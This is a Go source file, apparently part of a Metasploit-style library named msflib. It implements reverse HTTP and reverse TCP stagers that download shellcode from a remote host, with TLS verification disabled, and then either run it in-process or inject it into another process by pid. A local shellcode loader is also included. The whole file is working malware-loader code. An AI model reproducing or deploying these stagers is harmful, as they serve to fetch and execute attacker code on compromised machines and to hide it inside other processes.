package msflib

import (
	"crypto/tls"
	"encoding/binary"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"strings"
	"time"
)

var (
	CHECKSUMMODE int
	PLATFORM     int
)

func ReverseHTTP(hostAndPort string, pid int) error {
	// *** assumes hostAndPort is in format of <http://Domain>[:<Port>]
	httpClient := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	response, err := httpClient.Get(hostAndPort + "/" + getURL())
	if err != nil {
		return err
	}
	defer response.Body.Close()
	payload, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return err
	}
	if pid == -1 {
		return callPayload(payload)
	}
	return injectPayload(payload, pid)
}

func ReverseTCP(hostAndPort string, pid int) error {
	// *** assumes hostAndPort is in format of <IP/Domain>:<Port>
	socket, err := net.Dial("tcp", strings.TrimPrefix(hostAndPort, "tcp://"))
	if err != nil {
		return err
	}

	// read payload size
	var payloadSizeRaw = make([]byte, 4)
	_, err = io.ReadFull(socket, payloadSizeRaw)
	if err != nil {
		return err
	}
	payloadSize := int(binary.LittleEndian.Uint32(payloadSizeRaw))

	// read payload
	socket.SetReadDeadline(time.Now().Add(time.Duration(5) * time.Second))
	var payload = make([]byte, payloadSize)
	_, err = io.ReadFull(socket, payload)
	if err != nil {
		return err
	}

	// move SOCKET value to the EDI register
	socketFD := getFDBytes(socket.(*net.TCPConn))
	payload = append(append([]byte{0xBF}, socketFD...), payload...)

	if pid == -1 {
		return callPayload(payload)
	}
	return injectPayload(payload, pid)
}

// mostly for testing, but should work on any shellcode
func LoadLocal(file string, pid int) error {
	payload, _ := ioutil.ReadFile(file)
	if pid == -1 {
		return callPayload(payload)
	}
	return injectPayload(payload, pid)
}
